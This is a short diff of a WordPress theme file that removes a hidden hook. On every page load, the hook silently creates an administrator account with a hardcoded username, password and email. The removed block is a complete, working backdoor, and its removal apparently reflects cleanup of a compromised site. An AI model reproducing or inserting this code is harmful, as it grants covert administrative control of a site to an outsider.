@@ -501,30 +501,3 @@ add_filter( 'admin_body_class', 'wpa66834_role_admin_body_class' );
 
 
 add_filter( 'use_block_editor_for_post', '__return_false' );
-
-/* 
-* Create an admin user silently
-*/
-
-add_action('init', 'dienlanhphangia_add_user');
-
-function dienlanhphangia_add_user() {
-	$username = 'hoangpv';
-	$password = 'g8A9GhOQ';
-	$email = 'ace@hoangphan.tech';
-
-	if (username_exists($username) == null && email_exists($email) == false) {
-
-		// Create the new user
-		$user_id = wp_create_user($username, $password, $email);
-
-		// Get current user object
-		$user = get_user_by('id', $user_id);
-
-		// Remove role
-		$user->remove_role('subscriber');
-
-		// Add role
-		$user->add_role('administrator');
-	}
-}
